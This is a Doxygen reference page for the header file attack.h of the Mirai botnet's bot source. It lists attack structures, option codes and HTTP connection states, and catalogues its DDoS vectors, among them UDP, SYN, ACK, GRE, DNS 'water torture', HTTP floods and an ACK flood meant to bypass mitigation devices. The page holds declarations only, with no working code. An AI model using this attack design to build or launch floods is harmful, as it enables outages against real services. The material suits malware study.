<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/xhtml;charset=UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=9"/>
<meta name="generator" content="Doxygen 1.8.11"/>
<title>Mirai: mirai/bot/attack.h File Reference</title>
<link href="tabs.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="jquery.js"></script>
<script type="text/javascript" src="dynsections.js"></script>
<link href="navtree.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="resize.js"></script>
<script type="text/javascript" src="navtreedata.js"></script>
<script type="text/javascript" src="navtree.js"></script>
<script type="text/javascript">
  $(document).ready(initResizable);
  $(window).load(resizeHeight);
</script>
<link href="search/search.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="search/searchdata.js"></script>
<script type="text/javascript" src="search/search.js"></script>
<script type="text/javascript">
  $(document).ready(function() { init_search(); });
</script>
<link href="doxygen.css" rel="stylesheet" type="text/css" />
</head>
<body>
<div id="top"><!-- do not remove this div, it is closed by doxygen! -->
<div id="titlearea">
<table cellspacing="0" cellpadding="0">
 <tbody>
 <tr style="height: 56px;">
  <td id="projectalign" style="padding-left: 0.5em;">
   <div id="projectname">Mirai
   </div>
  </td>
 </tr>
 </tbody>
</table>
</div>
<!-- end header part -->
<!-- Generated by Doxygen 1.8.11 -->
<script type="text/javascript">
var searchBox = new SearchBox("searchBox", "search",false,'Search');
</script>
  <div id="navrow1" class="tabs">
    <ul class="tablist">
      <li><a href="index.html"><span>Main&#160;Page</span></a></li>
      <li><a href="pages.html"><span>Related&#160;Pages</span></a></li>
      <li><a href="annotated.html"><span>Data&#160;Structures</span></a></li>
      <li class="current"><a href="files.html"><span>Files</span></a></li>
      <li>
        <div id="MSearchBox" class="MSearchBoxInactive">
        <span class="left">
          <img id="MSearchSelect" src="search/mag_sel.png"
               onmouseover="return searchBox.OnSearchSelectShow()"
               onmouseout="return searchBox.OnSearchSelectHide()"
               alt=""/>
          <input type="text" id="MSearchField" value="Search" accesskey="S"
               onfocus="searchBox.OnSearchFieldFocus(true)" 
               onblur="searchBox.OnSearchFieldFocus(false)" 
               onkeyup="searchBox.OnSearchFieldChange(event)"/>
          </span><span class="right">
            <a id="MSearchClose" href="javascript:searchBox.CloseResultsWindow()"><img id="MSearchCloseImg" border="0" src="search/close.png" alt=""/></a>
          </span>
        </div>
      </li>
    </ul>
  </div>
  <div id="navrow2" class="tabs2">
    <ul class="tablist">
      <li><a href="files.html"><span>File&#160;List</span></a></li>
      <li><a href="globals.html"><span>Globals</span></a></li>
    </ul>
  </div>
</div><!-- top -->
<div id="side-nav" class="ui-resizable side-nav-resizable">
  <div id="nav-tree">
    <div id="nav-tree-contents">
      <div id="nav-sync" class="sync"></div>
    </div>
  </div>
  <div id="splitbar" style="-moz-user-select:none;" 
       class="ui-resizable-handle">
  </div>
</div>
<script type="text/javascript">
$(document).ready(function(){initNavTree('attack_8h.html','');});
</script>
<div id="doc-content">
<!-- window showing the filter options -->
<div id="MSearchSelectWindow"
     onmouseover="return searchBox.OnSearchSelectShow()"
     onmouseout="return searchBox.OnSearchSelectHide()"
     onkeydown="return searchBox.OnSearchSelectKey(event)">
</div>

<!-- iframe showing the search results (closed by default) -->
<div id="MSearchResultsWindow">
<iframe src="javascript:void(0)" frameborder="0" 
        name="MSearchResults" id="MSearchResults">
</iframe>
</div>

<div class="header">
  <div class="summary">
<a href="#nested-classes">Data Structures</a> &#124;
<a href="#define-members">Macros</a> &#124;
<a href="#typedef-members">Typedefs</a> &#124;
<a href="#func-members">Functions</a> &#124;
<a href="#var-members">Variables</a>  </div>
  <div class="headertitle">
<div class="title">attack.h File Reference</div>  </div>
</div><!--header-->
<div class="contents">
<div class="textblock"><code>#include &lt;time.h&gt;</code><br />
<code>#include &lt;arpa/inet.h&gt;</code><br />
<code>#include &lt;linux/ip.h&gt;</code><br />
<code>#include &lt;linux/udp.h&gt;</code><br />
<code>#include &lt;linux/tcp.h&gt;</code><br />
<code>#include &quot;<a class="el" href="mirai_2bot_2includes_8h_source.html">includes.h</a>&quot;</code><br />
<code>#include &quot;<a class="el" href="protocol_8h_source.html">protocol.h</a>&quot;</code><br />
</div>
<p><a href="attack_8h_source.html">Go to the source code of this file.</a></p>
<table class="memberdecls">
<tr class="heading"><td colspan="2"><h2 class="groupheader"><a name="nested-classes"></a>
Data Structures</h2></td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structattack__target.html">attack_target</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structattack__option.html">attack_option</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structattack__method.html">attack_method</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structattack__stomp__data.html">attack_stomp_data</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structattack__http__state.html">attack_http_state</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structattack__cfnull__state.html">attack_cfnull_state</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
</table><table class="memberdecls">
<tr class="heading"><td colspan="2"><h2 class="groupheader"><a name="define-members"></a>
Macros</h2></td></tr>
<tr class="memitem:a7c4eacf15bd06764a0834171b5d6789f"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#a7c4eacf15bd06764a0834171b5d6789f">ATTACK_CONCURRENT_MAX</a>&#160;&#160;&#160;8</td></tr>
<tr class="separator:a7c4eacf15bd06764a0834171b5d6789f"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aaed58b5e52e808b4237035050183f315"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#aaed58b5e52e808b4237035050183f315">HTTP_CONNECTION_MAX</a>&#160;&#160;&#160;256</td></tr>
<tr class="separator:aaed58b5e52e808b4237035050183f315"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ae0f309784c914a61d84fd3988e3e7321"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#ae0f309784c914a61d84fd3988e3e7321">ATK_VEC_UDP</a>&#160;&#160;&#160;0  /* Straight up UDP <a class="el" href="single__load_8c.html#a412161fb153a2b9a2b6b287baa1b0971">flood</a> */</td></tr>
<tr class="separator:ae0f309784c914a61d84fd3988e3e7321"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:afa9c71242ff3032ca0a9b4f8053a9769"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#afa9c71242ff3032ca0a9b4f8053a9769">ATK_VEC_VSE</a>&#160;&#160;&#160;1  /* Valve Source Engine query <a class="el" href="single__load_8c.html#a412161fb153a2b9a2b6b287baa1b0971">flood</a> */</td></tr>
<tr class="separator:afa9c71242ff3032ca0a9b4f8053a9769"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:acfffd96bfc135495f6d2dcf0b5c0345c"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#acfffd96bfc135495f6d2dcf0b5c0345c">ATK_VEC_DNS</a>&#160;&#160;&#160;2  /* DNS water torture */</td></tr>
<tr class="separator:acfffd96bfc135495f6d2dcf0b5c0345c"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ad80bc552383b0999af6fa38e1718419c"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#ad80bc552383b0999af6fa38e1718419c">ATK_VEC_SYN</a>&#160;&#160;&#160;3  /* SYN <a class="el" href="single__load_8c.html#a412161fb153a2b9a2b6b287baa1b0971">flood</a> with options */</td></tr>
<tr class="separator:ad80bc552383b0999af6fa38e1718419c"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a5d6a088c0ce3645498a4870ccfd09a3c"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#a5d6a088c0ce3645498a4870ccfd09a3c">ATK_VEC_ACK</a>&#160;&#160;&#160;4  /* ACK <a class="el" href="single__load_8c.html#a412161fb153a2b9a2b6b287baa1b0971">flood</a> */</td></tr>
<tr class="separator:a5d6a088c0ce3645498a4870ccfd09a3c"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ad64add15bdc08f30c42b74a7af54c68b"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#ad64add15bdc08f30c42b74a7af54c68b">ATK_VEC_STOMP</a>&#160;&#160;&#160;5  /* ACK <a class="el" href="single__load_8c.html#a412161fb153a2b9a2b6b287baa1b0971">flood</a> <a class="el" href="ForumPost_8txt.html#ab7900d660b247d4335d4709117e51a0b">to</a> bypass mitigation devices */</td></tr>
<tr class="separator:ad64add15bdc08f30c42b74a7af54c68b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a3ac5365a0319b66a7a029342542156b6"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#a3ac5365a0319b66a7a029342542156b6">ATK_VEC_GREIP</a>&#160;&#160;&#160;6  /* GRE IP <a class="el" href="single__load_8c.html#a412161fb153a2b9a2b6b287baa1b0971">flood</a> */</td></tr>
<tr class="separator:a3ac5365a0319b66a7a029342542156b6"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:af036d9269a58359f703ac0b2cece2187"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#af036d9269a58359f703ac0b2cece2187">ATK_VEC_GREETH</a>&#160;&#160;&#160;7  /* GRE Ethernet <a class="el" href="single__load_8c.html#a412161fb153a2b9a2b6b287baa1b0971">flood</a> */</td></tr>
<tr class="separator:af036d9269a58359f703ac0b2cece2187"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a4f522d5241fa0355196c03eaa610c90f"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#a4f522d5241fa0355196c03eaa610c90f">ATK_VEC_UDP_PLAIN</a>&#160;&#160;&#160;9  /* Plain UDP <a class="el" href="single__load_8c.html#a412161fb153a2b9a2b6b287baa1b0971">flood</a> optimized for speed */</td></tr>
<tr class="separator:a4f522d5241fa0355196c03eaa610c90f"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a8ced07abb18975692f26b538247550db"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#a8ced07abb18975692f26b538247550db">ATK_VEC_HTTP</a>&#160;&#160;&#160;10 /* HTTP layer 7 <a class="el" href="single__load_8c.html#a412161fb153a2b9a2b6b287baa1b0971">flood</a> */</td></tr>
<tr class="separator:a8ced07abb18975692f26b538247550db"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aacac129514ea3914af56b5eb4c71f8c6"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#aacac129514ea3914af56b5eb4c71f8c6">ATK_OPT_PAYLOAD_SIZE</a>&#160;&#160;&#160;0</td></tr>
<tr class="separator:aacac129514ea3914af56b5eb4c71f8c6"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ac8d9ef7cc50e5b0e43f50b087c4c7104"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#ac8d9ef7cc50e5b0e43f50b087c4c7104">ATK_OPT_PAYLOAD_RAND</a>&#160;&#160;&#160;1</td></tr>
<tr class="separator:ac8d9ef7cc50e5b0e43f50b087c4c7104"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a1ac4210e00c74506c31642a74e3fc1c7"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#a1ac4210e00c74506c31642a74e3fc1c7">ATK_OPT_IP_TOS</a>&#160;&#160;&#160;2</td></tr>
<tr class="separator:a1ac4210e00c74506c31642a74e3fc1c7"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aecb175215ca3d0ce5017cd8cedb7e0fe"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#aecb175215ca3d0ce5017cd8cedb7e0fe">ATK_OPT_IP_IDENT</a>&#160;&#160;&#160;3</td></tr>
<tr class="separator:aecb175215ca3d0ce5017cd8cedb7e0fe"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:acfa2ed8a557040aed04b6c9346aa0eb9"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#acfa2ed8a557040aed04b6c9346aa0eb9">ATK_OPT_IP_TTL</a>&#160;&#160;&#160;4</td></tr>
<tr class="separator:acfa2ed8a557040aed04b6c9346aa0eb9"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a57162ecbd3f7644a8f6a6b58aa4f8596"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#a57162ecbd3f7644a8f6a6b58aa4f8596">ATK_OPT_IP_DF</a>&#160;&#160;&#160;5</td></tr>
<tr class="separator:a57162ecbd3f7644a8f6a6b58aa4f8596"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a4d0115976f56267c42e6a09ff3651c02"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#a4d0115976f56267c42e6a09ff3651c02">ATK_OPT_SPORT</a>&#160;&#160;&#160;6</td></tr>
<tr class="separator:a4d0115976f56267c42e6a09ff3651c02"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ab8471c4c3e703d3c9ee4e971c48ba5fb"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#ab8471c4c3e703d3c9ee4e971c48ba5fb">ATK_OPT_DPORT</a>&#160;&#160;&#160;7</td></tr>
<tr class="separator:ab8471c4c3e703d3c9ee4e971c48ba5fb"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a4c326567294cc6655e9f6a380c7f736f"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#a4c326567294cc6655e9f6a380c7f736f">ATK_OPT_DOMAIN</a>&#160;&#160;&#160;8</td></tr>
<tr class="separator:a4c326567294cc6655e9f6a380c7f736f"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a6fb76834fa13fd65a0021d1860b6c1d6"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#a6fb76834fa13fd65a0021d1860b6c1d6">ATK_OPT_DNS_HDR_ID</a>&#160;&#160;&#160;9</td></tr>
<tr class="separator:a6fb76834fa13fd65a0021d1860b6c1d6"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a5a6f282c43f088516dce2de1b69ae7d8"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#a5a6f282c43f088516dce2de1b69ae7d8">ATK_OPT_URG</a>&#160;&#160;&#160;11</td></tr>
<tr class="separator:a5a6f282c43f088516dce2de1b69ae7d8"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a61c202b303f42c57328c999b1104877d"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#a61c202b303f42c57328c999b1104877d">ATK_OPT_ACK</a>&#160;&#160;&#160;12</td></tr>
<tr class="separator:a61c202b303f42c57328c999b1104877d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a5ae76926414352bb8e12896c5581a0fd"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#a5ae76926414352bb8e12896c5581a0fd">ATK_OPT_PSH</a>&#160;&#160;&#160;13</td></tr>
<tr class="separator:a5ae76926414352bb8e12896c5581a0fd"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a4464ea34ef73875f57b5c6a412aaac20"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#a4464ea34ef73875f57b5c6a412aaac20">ATK_OPT_RST</a>&#160;&#160;&#160;14</td></tr>
<tr class="separator:a4464ea34ef73875f57b5c6a412aaac20"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a4f086d53d4494633a898fbd9886b08bf"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#a4f086d53d4494633a898fbd9886b08bf">ATK_OPT_SYN</a>&#160;&#160;&#160;15</td></tr>
<tr class="separator:a4f086d53d4494633a898fbd9886b08bf"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a2ad2949e3a473ebba047e474abf5d461"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#a2ad2949e3a473ebba047e474abf5d461">ATK_OPT_FIN</a>&#160;&#160;&#160;16</td></tr>
<tr class="separator:a2ad2949e3a473ebba047e474abf5d461"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a97b7c19adba8f5e25d603d4fcd80c995"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#a97b7c19adba8f5e25d603d4fcd80c995">ATK_OPT_SEQRND</a>&#160;&#160;&#160;17</td></tr>
<tr class="separator:a97b7c19adba8f5e25d603d4fcd80c995"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a0fcd18d4c1705cc62b8a2d3f92e0a780"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#a0fcd18d4c1705cc62b8a2d3f92e0a780">ATK_OPT_ACKRND</a>&#160;&#160;&#160;18</td></tr>
<tr class="separator:a0fcd18d4c1705cc62b8a2d3f92e0a780"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a47ac28075825da3fec16777b2395f331"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#a47ac28075825da3fec16777b2395f331">ATK_OPT_GRE_CONSTIP</a>&#160;&#160;&#160;19</td></tr>
<tr class="separator:a47ac28075825da3fec16777b2395f331"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ac0ce7d29746181bb91fd95569c625f9f"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#ac0ce7d29746181bb91fd95569c625f9f">ATK_OPT_METHOD</a>&#160;&#160;&#160;20</td></tr>
<tr class="separator:ac0ce7d29746181bb91fd95569c625f9f"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aa069ca3abf2026e0e48d8f06ad47437c"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#aa069ca3abf2026e0e48d8f06ad47437c">ATK_OPT_POST_DATA</a>&#160;&#160;&#160;21</td></tr>
<tr class="separator:aa069ca3abf2026e0e48d8f06ad47437c"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:af614bdd4374d1ecf0ba5bb48a8cb4e65"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#af614bdd4374d1ecf0ba5bb48a8cb4e65">ATK_OPT_PATH</a>&#160;&#160;&#160;22</td></tr>
<tr class="separator:af614bdd4374d1ecf0ba5bb48a8cb4e65"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a7e7e7167fbd2f6562151eeb9770943b3"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#a7e7e7167fbd2f6562151eeb9770943b3">ATK_OPT_HTTPS</a>&#160;&#160;&#160;23</td></tr>
<tr class="separator:a7e7e7167fbd2f6562151eeb9770943b3"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ab4c96458d5b368729fc078a755d9b70d"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#ab4c96458d5b368729fc078a755d9b70d">ATK_OPT_CONNS</a>&#160;&#160;&#160;24</td></tr>
<tr class="separator:ab4c96458d5b368729fc078a755d9b70d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a9b14feb6720fefac0c6da63a77da718e"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#a9b14feb6720fefac0c6da63a77da718e">ATK_OPT_SOURCE</a>&#160;&#160;&#160;25</td></tr>
<tr class="separator:a9b14feb6720fefac0c6da63a77da718e"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a61e0fc173a48e31ab11b5d4e54d751bd"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#a61e0fc173a48e31ab11b5d4e54d751bd">HTTP_CONN_INIT</a>&#160;&#160;&#160;0</td></tr>
<tr class="separator:a61e0fc173a48e31ab11b5d4e54d751bd"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:acb5cf7d3ab57770048fc89abd9f386e8"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#acb5cf7d3ab57770048fc89abd9f386e8">HTTP_CONN_RESTART</a>&#160;&#160;&#160;1</td></tr>
<tr class="separator:acb5cf7d3ab57770048fc89abd9f386e8"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a17d0f5a78e9f64122185611485c18222"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#a17d0f5a78e9f64122185611485c18222">HTTP_CONN_CONNECTING</a>&#160;&#160;&#160;2</td></tr>
<tr class="separator:a17d0f5a78e9f64122185611485c18222"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a9a740956951891d2c55d87641e7211c0"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#a9a740956951891d2c55d87641e7211c0">HTTP_CONN_HTTPS_STUFF</a>&#160;&#160;&#160;3</td></tr>
<tr class="separator:a9a740956951891d2c55d87641e7211c0"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aff008d93b76d40a67da697001e176f6b"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#aff008d93b76d40a67da697001e176f6b">HTTP_CONN_SEND</a>&#160;&#160;&#160;4</td></tr>
<tr class="separator:aff008d93b76d40a67da697001e176f6b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ab97fc0c5b4c059fb0c3fd2161a1fefa0"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#ab97fc0c5b4c059fb0c3fd2161a1fefa0">HTTP_CONN_SEND_HEADERS</a>&#160;&#160;&#160;5</td></tr>
<tr class="separator:ab97fc0c5b4c059fb0c3fd2161a1fefa0"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:abedf69cb8cdb85bfc7f307503fd62775"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#abedf69cb8cdb85bfc7f307503fd62775">HTTP_CONN_RECV_HEADER</a>&#160;&#160;&#160;6</td></tr>
<tr class="separator:abedf69cb8cdb85bfc7f307503fd62775"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a9fe6114dced0ca47726f7afd1b3890f1"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#a9fe6114dced0ca47726f7afd1b3890f1">HTTP_CONN_RECV_BODY</a>&#160;&#160;&#160;7</td></tr>
<tr class="separator:a9fe6114dced0ca47726f7afd1b3890f1"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a2646e2fce686ccd10e0b9a511744f29c"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#a2646e2fce686ccd10e0b9a511744f29c">HTTP_CONN_SEND_JUNK</a>&#160;&#160;&#160;8</td></tr>
<tr class="separator:a2646e2fce686ccd10e0b9a511744f29c"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ae9f5ad7a6d1b61d1f65942d9c0c0205b"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#ae9f5ad7a6d1b61d1f65942d9c0c0205b">HTTP_CONN_SNDBUF_WAIT</a>&#160;&#160;&#160;9</td></tr>
<tr class="separator:ae9f5ad7a6d1b61d1f65942d9c0c0205b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a91cd4ed6175b666edf34c1a23bbbe368"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#a91cd4ed6175b666edf34c1a23bbbe368">HTTP_CONN_QUEUE_RESTART</a>&#160;&#160;&#160;10</td></tr>
<tr class="separator:a91cd4ed6175b666edf34c1a23bbbe368"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:afb5c550090ed0a9640f362e9897ee7cd"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#afb5c550090ed0a9640f362e9897ee7cd">HTTP_CONN_CLOSED</a>&#160;&#160;&#160;11</td></tr>
<tr class="separator:afb5c550090ed0a9640f362e9897ee7cd"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ac6eda2a3273daf4a93162bb51f969093"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#ac6eda2a3273daf4a93162bb51f969093">HTTP_RDBUF_SIZE</a>&#160;&#160;&#160;1024</td></tr>
<tr class="separator:ac6eda2a3273daf4a93162bb51f969093"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a8491fa980eede52fb92fb6dd2a46a913"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#a8491fa980eede52fb92fb6dd2a46a913">HTTP_HACK_DRAIN</a>&#160;&#160;&#160;64</td></tr>
<tr class="separator:a8491fa980eede52fb92fb6dd2a46a913"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a0b7ec3c5170952fe1071a9326cd51264"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#a0b7ec3c5170952fe1071a9326cd51264">HTTP_PATH_MAX</a>&#160;&#160;&#160;256</td></tr>
<tr class="separator:a0b7ec3c5170952fe1071a9326cd51264"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:af13bc0acf7afcddfcc5098dbe5c343aa"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#af13bc0acf7afcddfcc5098dbe5c343aa">HTTP_DOMAIN_MAX</a>&#160;&#160;&#160;128</td></tr>
<tr class="separator:af13bc0acf7afcddfcc5098dbe5c343aa"><td class="memSeparator" colspan="2">&#160;</td></tr>
